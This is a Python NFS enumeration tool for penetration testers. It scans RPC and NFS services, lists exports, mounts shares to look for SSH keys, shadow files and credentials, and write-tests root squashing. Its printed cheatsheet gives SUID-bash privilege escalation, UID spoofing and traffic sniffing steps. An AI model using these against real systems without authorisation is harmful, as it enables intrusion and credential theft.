#!/usr/bin/env python3
"""
nfs_enum.py — NFS Enumeration Tool
Phases: Port → RPC → Showmount → Security Analysis → Mount & Explore → Nmap NSE
Usage:  python3 nfs_enum.py <target> [--mount] [--skip-nmap] [--output DIR]
"""

import argparse
import fnmatch
import json
import os
import shutil
import socket
import stat as statmod
import subprocess
import sys
import tempfile
from datetime import datetime
from pathlib import Path

# ── ANSI colors (auto-disabled when not a TTY or NO_COLOR is set) ──────────────
_USE_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
def _c(code: str) -> str:
    return code if _USE_COLOR else ""

R  = _c('\033[91m')   # red
G  = _c('\033[92m')   # green
Y  = _c('\033[93m')   # yellow
B  = _c('\033[94m')   # blue
C  = _c('\033[96m')   # cyan
BD = _c('\033[1m')
DM = _c('\033[2m')
RS = _c('\033[0m')

# ── Logging helpers ───────────────────────────────────────────────────────────
def info(msg):  print(f"  {B}[*]{RS} {msg}")
def ok(msg):    print(f"  {G}[+]{RS} {msg}")
def warn(msg):  print(f"  {Y}[!]{RS} {msg}")
def err(msg):   print(f"  {R}[-]{RS} {msg}")
def crit(msg):  print(f"  {R}{BD}[CRITICAL]{RS} {BD}{msg}{RS}")

def section(title):
    bar = f"{C}{BD}{'─' * 64}{RS}"
    print(f"\n{bar}\n{C}{BD}  ▶  {title}{RS}\n{bar}")

# ── Result store ──────────────────────────────────────────────────────────────
report: dict = {
    "target": "", "timestamp": "",
    "open_ports": {}, "rpc_services": [],
    "exports": [], "security_findings": [],
    "mounted_shares": {}
}

# ── Subprocess helpers ────────────────────────────────────────────────────────
def run(args: list, timeout: int = 20) -> tuple[str | None, str, int]:
    """Return (stdout, stderr, returncode). stdout is None on failure."""
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        out_ = p.stdout.strip() or None
        return out_, p.stderr.strip(), p.returncode
    except FileNotFoundError:
        return None, f"command not found: {args[0]}", 127
    except subprocess.TimeoutExpired:
        return None, "timeout", -1
    except Exception as exc:
        return None, str(exc), -1

def out(args: list, timeout: int = 20) -> str | None:
    """Run command and return stdout only, or None."""
    o, _, _ = run(args, timeout)
    return o

def tool_available(name: str) -> bool:
    return shutil.which(name) is not None

# nmap needs a long leash — -sV + NSE scripts routinely run past 20s.
NMAP_TIMEOUT = 300

# ── Mount-safety helpers ──────────────────────────────────────────────────────
def is_mounted(path: str) -> bool:
    """True if `path` is a current mountpoint, per /proc/mounts."""
    real = os.path.realpath(path)
    try:
        with open("/proc/mounts") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 2 and os.path.realpath(parts[1]) == real:
                    return True
    except OSError:
        pass
    return False

def safe_umount(mnt: str) -> bool:
    """Try increasingly forceful unmounts; return True once unmounted.
    Never deletes anything — just unmounts."""
    if not is_mounted(mnt):
        return True
    for args in (["umount", mnt], ["umount", "-f", mnt], ["umount", "-l", mnt]):
        run(args, timeout=15)
        if not is_mounted(mnt):
            return True
    return not is_mounted(mnt)

# ── Phase 0: Banner ───────────────────────────────────────────────────────────
def banner():
    print(f"""{C}{BD}
  ╔╗╔╔═╗╔═╗  ╔═╗╔╗╔╦ ╦╔╦╗
  ║║║╠╣ ╚═╗  ║╣ ║║║║ ║║║║
  ╝╚╝╚  ╚═╝  ╚═╝╝╚╝╚═╝╩ ╩
{RS}  {DM}NFS Enumeration Tool{RS}
""")

# ── Phase 1: Port & connectivity ──────────────────────────────────────────────
# Note: 111 (portmapper) and often mountd are reachable over UDP as well as TCP,
# and mountd/lockd ports are usually assigned dynamically and registered with the
# portmapper — the numbers below are only the common defaults. rpcinfo (Phase 2)
# is the authoritative source for what's actually running and on which ports.
NFS_PORTS = {
    111:   "RPC Portmapper",
    2049:  "NFS",
    20048: "mountd (default)",
    4045:  "lockd (Solaris default)",
}

def tcp_open(host: str, port: int, timeout: float = 2.0) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        ok_ = s.connect_ex((host, port)) == 0
        s.close()
        return ok_
    except Exception:
        return False

def phase_ports(host: str, timeout: float = 2.0) -> bool:
    section("PHASE 1 — Port & Connectivity Check (TCP)")
    open_ports: dict[int, bool] = {}
    for port, svc in NFS_PORTS.items():
        up = tcp_open(host, port, timeout)
        open_ports[port] = up
        state = f"{G}OPEN  {RS}" if up else f"{R}CLOSED{RS}"
        print(f"    TCP/{port:<6}  {svc:<22}  {state}")
    report["open_ports"] = {str(p): v for p, v in open_ports.items()}

    print(f"    {DM}(TCP only — portmapper/mountd may answer on UDP; trust rpcinfo){RS}")

    if not (open_ports.get(111) or open_ports.get(2049)):
        warn("111 and 2049 both closed over TCP — may be UDP-only, filtered, or down")
        return False
    return True

# ── Phase 2: RPC enumeration ──────────────────────────────────────────────────
def phase_rpc(host: str):
    section("PHASE 2 — RPC Service Enumeration")

    if tool_available("rpcinfo"):
        info(f"rpcinfo -p {host}")
        data = out(["rpcinfo", "-p", host])
        if data:
            nfs_lines = []
            print()
            for line in data.splitlines():
                nfs_kw = any(k in line.lower() for k in
                             ("nfs", "mount", "nlockmgr", "status"))
                if nfs_kw:
                    print(f"    {G}{line}{RS}")
                    nfs_lines.append(line)
                else:
                    print(f"    {DM}{line}{RS}")
            report["rpc_services"] = nfs_lines
            return
        else:
            warn(f"rpcinfo returned nothing for {host}")
    else:
        warn("rpcinfo not found — trying nmap fallback")

    if tool_available("nmap"):
        info(f"nmap --script rpcinfo -p 111 {host} -Pn")
        data = out(["nmap", "--script", "rpcinfo", "-p", "111", host, "-Pn"],
                   timeout=NMAP_TIMEOUT)
        if data:
            print(f"\n{DM}{data}{RS}")
    else:
        err("Neither rpcinfo nor nmap available for RPC enumeration")

# ── Phase 3: Showmount ────────────────────────────────────────────────────────
def parse_exports(raw: str) -> list[dict]:
    exports = []
    for line in raw.splitlines():
        line = line.strip()
        if not line or "export list" in line.lower():
            continue
        parts   = line.split()
        path    = parts[0]
        clients = " ".join(parts[1:]) if len(parts) > 1 else "*"
        exports.append({"path": path, "clients": clients})
    return exports

def phase_showmount(host: str) -> list[dict]:
    section("PHASE 3 — NFS Share Enumeration  (showmount)")
    exports: list[dict] = []

    if not tool_available("showmount"):
        warn("showmount not found — install nfs-common or use nmap fallback")
    else:
        # Try --no-headers first, then plain
        for args in (["showmount", "-e", host, "--no-headers"],
                     ["showmount", "-e", host]):
            data = out(args)
            if data:
                exports = parse_exports(data)
                break

        if exports:
            info(f"showmount -e {host}:")
            print()
            for exp in exports:
                path    = exp["path"]
                clients = exp["clients"]
                anyone  = clients.strip() in ("*", "(everyone)", "everyone", "")
                if anyone:
                    print(f"    {Y}{path:<38}{RS}  →  {R}{BD}{clients}  ← ANYONE CAN MOUNT{RS}")
                else:
                    print(f"    {G}{path:<38}{RS}  →  {C}{clients}{RS}")
        else:
            err(f"showmount -e {host} returned nothing")

        # Active mounts
        print()
        info(f"showmount -a {host}  (active client mounts)")
        active = out(["showmount", "-a", host])
        if active:
            for line in active.splitlines():
                if "all mount" not in line.lower() and line.strip():
                    print(f"    {DM}{line}{RS}")
        else:
            print(f"    {DM}(none or not available){RS}")

    # Nmap fallback / supplement
    if not exports and tool_available("nmap"):
        info("Trying nmap nfs-showmount script...")
        data = out(["nmap", "--script", "nfs-showmount",
                    "-p", "111,2049", host, "-Pn"], timeout=NMAP_TIMEOUT)
        if data:
            print(f"\n{DM}{data}{RS}")

    if not exports:
        warn("No exports via MOUNT protocol. NFSv4 dropped MOUNT, so a v4-only "
             "server shows nothing here — Phase 5 (--mount) will try the v4 "
             "pseudo-root (host:/) instead.")

    report["exports"] = exports
    return exports

# ── Phase 4: Security analysis ────────────────────────────────────────────────
# These options live server-side in /etc/exports and are NOT advertised over the
# MOUNT/NFS protocols, so they cannot be read remotely. The only reliable remote
# check is a write-test after mounting — done in Phase 5 (--mount, as root).
DANGEROUS_OPTIONS = {
    "no_root_squash": (
        "CRITICAL",
        "no_root_squash — root (UID 0) on the client is NOT squashed. "
        "Root on your box = root on the share. Classic privesc: drop a SUID "
        "bash onto the share from root, execute it on the target."
    ),
    "no_all_squash": (
        "HIGH",
        "no_all_squash — UIDs/GIDs preserved, not remapped to nobody. "
        "Create a local user matching a target file owner's UID to read its files."
    ),
    "insecure": (
        "MEDIUM",
        "insecure — NFS accepts connections from unprivileged source ports (>1024), "
        "so any unprivileged user/process can mount the share."
    ),
}

ATTACK_CHEATSHEET = f"""
  {Y}┌── Attack Vectors ──────────────────────────────────────────────────────────┐{RS}
  {Y}│{RS}                                                                            {Y}│{RS}
  {Y}│{RS}  {BD}[ no_root_squash + rw ]  ← CRITICAL privesc{RS}                           {Y}│{RS}
  {Y}│{RS}    On your box (as root):                                                   {Y}│{RS}
  {Y}│{RS}    {C}sudo mount -t nfs -o rw,vers=3,nolock <HOST>:/share /mnt/nfs{RS}          {Y}│{RS}
  {Y}│{RS}    {C}sudo cp /bin/bash /mnt/nfs/bash && sudo chmod +s /mnt/nfs/bash{RS}       {Y}│{RS}
  {Y}│{RS}    On target:                                                               {Y}│{RS}
  {Y}│{RS}    {C}/share/bash -p{RS}   → instant root shell                                {Y}│{RS}
  {Y}│{RS}                                                                            {Y}│{RS}
  {Y}│{RS}  {BD}[ no_all_squash ]  ← UID spoofing{RS}                                     {Y}│{RS}
  {Y}│{RS}    {C}ls -n /mnt/nfs                        {DM}# note UID of owner{RS}           {Y}│{RS}
  {Y}│{RS}    {C}sudo useradd -u <UID> -s /bin/bash attacker{RS}                          {Y}│{RS}
  {Y}│{RS}    {C}su attacker && cat /mnt/nfs/sensitive_file{RS}                           {Y}│{RS}
  {Y}│{RS}                                                                            {Y}│{RS}
  {Y}│{RS}  {BD}[ NFSv3 sniffing ]  ← no auth / no encryption{RS}                        {Y}│{RS}
  {Y}│{RS}    {C}sudo tcpdump -i eth0 -w nfs.pcap port 2049{RS}                           {Y}│{RS}
  {Y}│{RS}    Wireshark → File → Export Objects → NFS                                {Y}│{RS}
  {Y}│{RS}                                                                            {Y}│{RS}
  {Y}│{RS}  {BD}[ Check /etc/exports manually if you have shell ]{RS}                      {Y}│{RS}
  {Y}│{RS}    {C}cat /etc/exports{RS}                                                      {Y}│{RS}
  {Y}│{RS}    {C}cat /var/lib/nfs/etab{RS}   {DM}← expanded options with defaults{RS}           {Y}│{RS}
  {Y}└────────────────────────────────────────────────────────────────────────────┘{RS}
"""

def phase_security(host: str, exports: list[dict]):
    section("PHASE 4 — Security Analysis")

    findings: list[dict] = []

    if not exports:
        warn("No exports to analyze")
    else:
        # Wildcard export check — this IS visible remotely.
        for exp in exports:
            if exp["clients"].strip() in ("*", "(everyone)", "everyone", ""):
                msg = f"Export '{exp['path']}' allows ANY host to mount"
                findings.append({"severity": "HIGH", "finding": msg})
                warn(msg)

        # nmap NFS scripts: readable file listing / statfs — useful recon,
        # but these do NOT reveal squash options.
        if tool_available("nmap"):
            info("Probing with nmap NFS scripts (nfs-ls, nfs-showmount, nfs-statfs)...")
            nmap_data = out([
                "nmap", "-sV", "--script", "nfs-ls,nfs-showmount,nfs-statfs",
                "-p", "111,2049", host, "-Pn"
            ], timeout=NMAP_TIMEOUT)
            if nmap_data:
                info("nmap NFS output:")
                print(f"\n{DM}{nmap_data}{RS}\n")

    warn("Root-squash (no_root_squash / no_all_squash) cannot be read remotely — "
         "it's a server-side /etc/exports flag. Run with --mount as root to "
         "confirm it via a write-test.")

    print(ATTACK_CHEATSHEET)
    report["security_findings"].extend(findings)

# ── Phase 5: Mount & explore ──────────────────────────────────────────────────
INTERESTING_PATTERNS = [
    ("id_rsa",          "SSH private key (RSA)"),
    ("id_ecdsa",        "SSH private key (ECDSA)"),
    ("id_ed25519",      "SSH private key (Ed25519)"),
    ("authorized_keys", "SSH authorized_keys"),
    ("*.key",           "Private key"),
    ("*.pem",           "Certificate / key"),
    (".bash_history",   "Shell history"),
    ("shadow",          "Shadow password file"),
    ("passwd",          "Passwd file"),
    ("*.conf",          "Config file"),
    ("*.cfg",           "Config file"),
    ("*.sh",            "Shell script"),
    ("*.py",            "Python script"),
    ("*.php",           "PHP script"),
    ("*.db",            "Database"),
    ("*.sqlite",        "SQLite database"),
    ("*.bak",           "Backup"),
    ("*password*",      "Password-related"),
    ("*secret*",        "Secret-related"),
    ("*token*",         "Token-related"),
    ("*credential*",    "Credential-related"),
]

MAX_WALK_DEPTH = 8

def explore_mount(mnt: str, share_path: str):
    """Single-pass os.walk over a mounted share: interesting files, SUID/SGID,
    world-writable dirs. Follows no symlinks; one traversal, not one per pattern."""
    data: dict = {"interesting": [], "suid": [], "world_writable": []}

    # Directory listing — numeric UIDs to spot ownership mismatches
    listing = out(["ls", "-lan", mnt])
    if listing:
        print(f"\n{DM}{listing}{RS}")

    hits: list[tuple[str, str]] = []
    for root, dirs, files in os.walk(mnt, followlinks=False):
        rel = os.path.relpath(root, mnt)
        depth = 0 if rel == "." else rel.count(os.sep) + 1
        if depth >= MAX_WALK_DEPTH:
            dirs[:] = []  # prune deeper traversal

        # World-writable directories
        for d in dirs:
            dp = os.path.join(root, d)
            try:
                st = os.lstat(dp)
                if st.st_mode & 0o002:
                    data["world_writable"].append(dp)
            except OSError:
                continue

        # Files: pattern match + SUID/SGID
        for fn in files:
            fp = os.path.join(root, fn)
            for pattern, label in INTERESTING_PATTERNS:
                if fnmatch.fnmatch(fn, pattern):
                    hits.append((label, fp))
                    break
            try:
                st = os.lstat(fp)
                if statmod.S_ISREG(st.st_mode) and (st.st_mode & 0o6000):
                    data["suid"].append(fp)
            except OSError:
                continue

    if hits:
        print(f"\n    {BD}Interesting files:{RS}")
        for label, f in hits:
            warn(f"  [{label}]  {f}")
            data["interesting"].append(f)

    for f in data["suid"]:
        crit(f"SUID/SGID file: {f}")
    for d in data["world_writable"]:
        warn(f"World-writable dir: {d}")

    report["mounted_shares"][share_path] = data


def test_root_squash(host: str, path: str, base: str):
    """Briefly mount rw and write a probe file to detect root squashing.
    Returns one of: 'no_root_squash', 'squashed', 'ro_or_denied', None.
    Cleans up the probe file and unmounts before returning."""
    safe = path.replace("/", "_").strip("_") or "root"
    mnt  = os.path.join(base, f"sqtest_{safe}")
    os.makedirs(mnt, exist_ok=True)

    mounted = False
    for vers in ("3", "4"):
        _, _, rc = run([
            "mount", "-t", "nfs",
            "-o", f"rw,vers={vers},nolock,soft,timeo=30,retrans=2",
            f"{host}:{path}", mnt
        ], timeout=20)
        if rc == 0:
            mounted = True
            break
    if not mounted:
        return None  # couldn't get a writable mount — can't test

    result = "ro_or_denied"
    probe = os.path.join(mnt, f".nfs_sq_{os.getpid()}")
    try:
        with open(probe, "w") as f:
            f.write("sqtest")
        st = os.stat(probe)
        result = "no_root_squash" if st.st_uid == 0 else "squashed"
    except OSError:
        result = "ro_or_denied"
    finally:
        try:
            if os.path.exists(probe):
                os.remove(probe)
        except OSError:
            pass
        safe_umount(mnt)
    return result


def _print_mount_commands(host: str, exports: list[dict]):
    for exp in exports:
        path = exp["path"]
        safe = path.replace("/", "_").strip("_") or "root"
        mnt  = f"/tmp/nfs_{safe}"
        print(f"    {DM}# ── {path} ──────────────────────────────────────────{RS}")
        print(f"    {C}mkdir -p {mnt}{RS}")
        print(f"    {C}sudo mount -t nfs -o ro,vers=3,nolock,soft,timeo=30,retrans=2 {host}:{path} {mnt}{RS}")
        print(f"    {C}ls -lan {mnt}{RS}                {DM}# note UIDs{RS}")
        print(f"    {C}find {mnt} -maxdepth 8 -perm /6000 2>/dev/null{RS}  {DM}# SUID/SGID{RS}")
        print(f"    {C}find {mnt} -maxdepth 8 \\( -name 'id_rsa*' -o -name '*.key' -o -name 'shadow' \\) 2>/dev/null{RS}")
        print(f"    {DM}# root-squash write-test (deliberate rw remount):{RS}")
        print(f"    {C}sudo mount -t nfs -o rw,vers=3,nolock {host}:{path} {mnt} && "
              f"sudo touch {mnt}/.sq && ls -n {mnt}/.sq && sudo rm {mnt}/.sq{RS}")
        print()
    print(f"    {DM}# NFSv4-only server? showmount shows nothing — mount the pseudo-root:{RS}")
    print(f"    {C}sudo mount -t nfs -o ro,vers=4,soft {host}:/ /tmp/nfs_v4root{RS}\n")


def phase_mount(host: str, exports: list[dict]):
    section("PHASE 5 — Mount & File Enumeration")

    if os.geteuid() != 0:
        warn("Not running as root — showing mount commands instead:\n")
        if exports:
            _print_mount_commands(host, exports)
        else:
            warn("No exports found; for a v4-only target try the pseudo-root:")
            print(f"    {C}sudo mount -t nfs -o ro,vers=4,soft {host}:/ /tmp/nfs_v4root{RS}\n")
        return

    base = tempfile.mkdtemp(prefix="nfs_enum_")
    try:
        if not exports:
            # NFSv4 fallback: MOUNT protocol is gone in v4, so showmount is blind.
            warn("No exports from showmount — attempting NFSv4 pseudo-root (ro) mount of /")
            mnt = os.path.join(base, "v4root")
            os.makedirs(mnt, exist_ok=True)
            _, stderr, rc = run([
                "mount", "-t", "nfs",
                "-o", "ro,vers=4,soft,timeo=30,retrans=2",
                f"{host}:/", mnt
            ], timeout=20)
            if rc == 0:
                ok(f"Mounted NFSv4 pseudo-root {host}:/  →  {mnt}")
                explore_mount(mnt, "/ (v4 pseudo-root)")
                if not safe_umount(mnt):
                    warn(f"Could not unmount {mnt} — leaving it in place")
            else:
                err(f"v4 pseudo-root mount failed: {stderr}")
            return

        for exp in exports:
            path = exp["path"]
            safe = path.replace("/", "_").strip("_") or "root"
            mnt  = os.path.join(base, safe)
            os.makedirs(mnt, exist_ok=True)

            # Read-only enumeration mount — never write during recon.
            mounted_vers = None
            for vers in ("3", "4", "2"):
                _, stderr, rc = run([
                    "mount", "-t", "nfs",
                    "-o", f"ro,vers={vers},nolock,soft,timeo=30,retrans=2",
                    f"{host}:{path}", mnt
                ], timeout=20)
                if rc == 0:
                    ok(f"Mounted {host}:{path}  (ro, NFSv{vers})  →  {mnt}")
                    explore_mount(mnt, path)
                    if not safe_umount(mnt):
                        warn(f"Could not unmount {mnt} — leaving it in place")
                    mounted_vers = vers
                    break
                else:
                    err(f"NFSv{vers} ro mount failed: {stderr}")
            if mounted_vers is None:
                err(f"Could not mount {host}:{path} with any NFS version")

            # Dedicated root-squash write-test (separate, deliberate rw mount).
            sq = test_root_squash(host, path, base)
            if sq == "no_root_squash":
                msg = f"no_root_squash CONFIRMED on {path} via write-test — root preserved on rw share"
                crit(msg)
                report["security_findings"].append(
                    {"severity": "CRITICAL", "finding": msg})
            elif sq == "squashed":
                info(f"{path}: root is squashed (probe landed as non-root)")
            elif sq == "ro_or_denied":
                info(f"{path}: read-only or write denied — root-squash test inconclusive")
            else:
                info(f"{path}: could not obtain a writable mount for the squash test")
    finally:
        # Only delete mountpoints we've confirmed are unmounted. Deleting into a
        # live NFS mount would unlink files on the remote share.
        leftover = False
        for child in Path(base).glob("*"):
            if is_mounted(str(child)):
                leftover = True
                warn(f"Still mounted, not deleting: {child}")
            else:
                shutil.rmtree(child, ignore_errors=True)
        if leftover:
            warn(f"Mounts remain under {base} — unmount them, then: rm -rf {base}")
        else:
            shutil.rmtree(base, ignore_errors=True)

# ── Phase 6: Nmap NSE ─────────────────────────────────────────────────────────
def phase_nmap(host: str):
    section("PHASE 6 — Nmap NSE  (nfs-ls · nfs-showmount · nfs-statfs)")

    if not tool_available("nmap"):
        err("nmap not found — skipping")
        return

    scripts = "nfs-ls,nfs-showmount,nfs-statfs"
    cmd_str = f"nmap -sV --script {scripts} -p 111,2049 {host} -Pn --open"
    info(cmd_str)
    data = out([
        "nmap", "-sV", "--script", scripts,
        "-p", "111,2049", host, "-Pn", "--open"
    ], timeout=NMAP_TIMEOUT)
    if data:
        print(f"\n{DM}{data}{RS}")
    else:
        err("nmap returned no output (or timed out)")

# ── Save report ───────────────────────────────────────────────────────────────
def save_report(host: str, out_dir: str):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    host_safe = host.replace(".", "_").replace(":", "_")
    Path(out_dir).mkdir(parents=True, exist_ok=True)

    # JSON
    jp = os.path.join(out_dir, f"nfs_{host_safe}_{ts}.json")
    with open(jp, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    ok(f"JSON report   →  {jp}")

    # Text summary
    tp = os.path.join(out_dir, f"nfs_{host_safe}_{ts}.txt")
    with open(tp, "w") as f:
        f.write("NFS Enumeration Report\n")
        f.write(f"Target    : {host}\n")
        f.write(f"Timestamp : {report['timestamp']}\n\n")

        f.write("=== OPEN PORTS (TCP) ===\n")
        for port, up in report["open_ports"].items():
            f.write(f"  {port}: {'OPEN' if up else 'CLOSED'}\n")

        f.write("\n=== EXPORTS ===\n")
        for exp in report["exports"]:
            f.write(f"  {exp['path']:<40} →  {exp['clients']}\n")

        f.write("\n=== SECURITY FINDINGS ===\n")
        if report["security_findings"]:
            for fin in report["security_findings"]:
                f.write(f"  [{fin['severity']:8}] {fin['finding']}\n")
        else:
            f.write("  No findings.\n")

        if report["mounted_shares"]:
            f.write("\n=== MOUNTED SHARE FINDINGS ===\n")
            for share, data in report["mounted_shares"].items():
                f.write(f"\n  Share: {share}\n")
                for label, items in data.items():
                    if items:
                        f.write(f"  {label}:\n")
                        for i in items:
                            f.write(f"    {i}\n")
    ok(f"Text summary  →  {tp}")

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="nfs_enum.py — NFS enumeration for pentesters",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 nfs_enum.py 10.10.10.10
  python3 nfs_enum.py 10.10.10.10 --mount
  sudo python3 nfs_enum.py 10.10.10.10 --mount --output ./loot
  python3 nfs_enum.py 10.10.10.10 --skip-nmap --timeout 3
"""
    )
    parser.add_argument("target",
                        help="Target IP or hostname")
    parser.add_argument("--mount", action="store_true",
                        help="Mount shares (ro) and enumerate files; "
                             "root also runs the root-squash write-test (requires root)")
    parser.add_argument("--skip-nmap", action="store_true",
                        help="Skip the nmap NSE phase")
    parser.add_argument("--output", default="./nfs_results", metavar="DIR",
                        help="Directory to write reports into (default: ./nfs_results)")
    parser.add_argument("--timeout", type=float, default=2.0,
                        help="TCP port-check timeout in seconds (default: 2)")
    args = parser.parse_args()

    banner()
    report["target"]    = args.target
    report["timestamp"] = datetime.now().isoformat()

    is_root = os.geteuid() == 0
    info(f"Target  : {BD}{args.target}{RS}")
    info(f"Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info(f"Root    : {G + 'yes' + RS if is_root else Y + 'no  (--mount will print commands)' + RS}")

    # ── Run phases ────────────────────────────────────────────────────────────
    reachable = phase_ports(args.target, args.timeout)
    if not reachable:
        info("Continuing anyway — RPC/showmount may still answer over UDP.")

    phase_rpc(args.target)
    exports = phase_showmount(args.target)
    phase_security(args.target, exports)

    if args.mount:
        phase_mount(args.target, exports)

    if not args.skip_nmap:
        phase_nmap(args.target)

    # ── Summary ───────────────────────────────────────────────────────────────
    section("SUMMARY")
    crits = [f for f in report["security_findings"] if f["severity"] == "CRITICAL"]
    highs = [f for f in report["security_findings"] if f["severity"] == "HIGH"]
    meds  = [f for f in report["security_findings"] if f["severity"] == "MEDIUM"]

    print(f"    Target        :  {BD}{args.target}{RS}")
    print(f"    Exports found :  {G if exports else R}{len(exports)}{RS}")
    print(f"    {R}{BD}CRITICAL{RS}      :  {len(crits)}")
    print(f"    {Y}HIGH{RS}          :  {len(highs)}")
    print(f"    {B}MEDIUM{RS}        :  {len(meds)}")

    if crits or highs:
        print()
        for f in crits + highs:
            if f["severity"] == "CRITICAL":
                crit(f["finding"])
            else:
                warn(f["finding"])

    print()
    save_report(args.target, args.output)
    print(f"\n{DM}{'─' * 64}{RS}\n")


if __name__ == "__main__":
    main()